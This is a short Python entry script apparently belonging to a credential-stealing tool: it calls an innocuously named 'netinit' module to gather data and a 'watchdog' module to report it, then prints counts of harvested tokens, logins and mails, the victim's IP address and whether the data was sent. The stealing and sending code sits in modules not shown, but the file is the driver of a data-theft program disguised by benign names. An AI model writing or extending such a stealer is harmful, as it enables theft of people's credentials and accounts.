#!/usr/bin/env python3
# main.py — gather via netinit, report via watchdog.

import netinit
import watchdog


def main():
    data = netinit.gather()
    ok = watchdog.report(data)
    print(
        f"[+] tokens: {len(data.get('tokens', []))} | "
        f"logins: {len(data.get('logins', []))} | "
        f"mails: {len(data.get('mails', []))} | "
        f"ip: {data.get('ip', '?')} | sent: {ok}"
    )


if __name__ == "__main__":
    main()
